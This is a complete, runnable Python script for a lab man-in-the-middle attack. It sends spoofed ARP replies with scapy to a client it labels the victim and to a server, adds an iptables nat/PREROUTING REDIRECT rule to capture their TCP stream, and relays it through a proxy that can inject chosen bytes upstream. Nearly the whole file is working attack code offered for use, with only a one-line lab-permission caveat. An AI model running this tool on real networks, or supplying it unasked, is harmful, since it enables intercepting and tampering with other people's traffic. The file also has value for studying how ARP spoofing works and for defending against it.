#!/usr/bin/env python3
"""ARP poison + iptables REDIRECT: a minimal man-in-the-middle for a lab.

The poisoning is the easy half. The half that actually stops you is this:
after poisoning, the frame still carries the *server's* IP address. The kernel
sees transit traffic, not a local socket, and a local listener never fires.
REDIRECT in the nat/PREROUTING chain turns those packets into local
connections before the routing decision is made.

Lab only: your own network, or written permission.
"""
import argparse
import os
import signal
import socket
import subprocess
import sys
import threading

from scapy.all import ARP, Ether, get_if_hwaddr, getmacbyip, sendp


def arp_reply(iface, dst_mac, dst_ip, claimed_ip, src_mac):
    sendp(Ether(dst=dst_mac, src=src_mac) /
          ARP(op=2, hwsrc=src_mac, psrc=claimed_ip,
              hwdst=dst_mac, pdst=dst_ip),
          iface=iface, verbose=False)


def poison_loop(args, peer, stop):
    """Keep lying about both directions until Ctrl-C.

    One spoofed packet is not enough: the cache heals, so this runs in a loop.
    """
    while not stop.is_set():
        arp_reply(args.iface, peer["client_mac"], args.client,
                  args.server, peer["my_mac"])
        arp_reply(args.iface, peer["server_mac"], args.server,
                  args.client, peer["my_mac"])
        stop.wait(args.interval)


def redirect_rule(args, add):
    """nat/PREROUTING: send the intercepted stream to our own port."""
    cmd = ["iptables", "-t", "nat", "-A" if add else "-D", "PREROUTING",
           "-s", args.client, "-d", args.server, "-p", "tcp",
           "--dport", str(args.port), "-j", "REDIRECT",
           "--to-ports", str(args.port)]
    subprocess.run(cmd, check=True)


def pump(src, dst):
    try:
        while True:
            data = src.recv(65535)
            if not data:
                return
            dst.sendall(data)
    except OSError:
        return


def handle(conn, args):
    with conn:
        upstream = socket.create_connection((args.server, args.port), timeout=5)
        with upstream:
            if args.inject:
                upstream.sendall(args.inject.encode())
            back = threading.Thread(target=pump, args=(conn, upstream),
                                    daemon=True)
            back.start()
            pump(upstream, conn)
            back.join(timeout=1)


def serve(args):
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", args.port))
    srv.listen(16)
    print(f"[*] waiting on :{args.port} for {args.client}")
    while True:
        conn, addr = srv.accept()
        if addr[0] != args.client:
            conn.close()
            continue
        threading.Thread(target=handle, args=(conn, args), daemon=True).start()


def main():
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--iface", required=True)
    p.add_argument("--client", required=True, help="victim IP")
    p.add_argument("--server", required=True, help="server IP")
    p.add_argument("--port", type=int, required=True)
    p.add_argument("--inject", help="bytes to send upstream on each connection")
    p.add_argument("--interval", type=float, default=1.0)
    args = p.parse_args()

    if os.geteuid() != 0:
        sys.exit("raw sockets and iptables need root")

    peer = {
        "my_mac": get_if_hwaddr(args.iface),
        "client_mac": getmacbyip(args.client, iface=args.iface),
        "server_mac": getmacbyip(args.server, iface=args.iface),
    }
    if not peer["client_mac"] or not peer["server_mac"]:
        sys.exit("could not resolve a MAC address")

    stop = threading.Event()

    def shutdown(*_):
        stop.set()
        arp_reply(args.iface, peer["client_mac"], args.client,
                  args.server, peer["server_mac"])
        arp_reply(args.iface, peer["server_mac"], args.server,
                  args.client, peer["client_mac"])
        redirect_rule(args, add=False)
        print("\n[*] ARP restored, iptables cleaned up")
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)
    signal.signal(signal.SIGTERM, shutdown)

    redirect_rule(args, add=True)
    threading.Thread(target=poison_loop, args=(args, peer, stop),
                     daemon=True).start()
    serve(args)


if __name__ == "__main__":
    main()
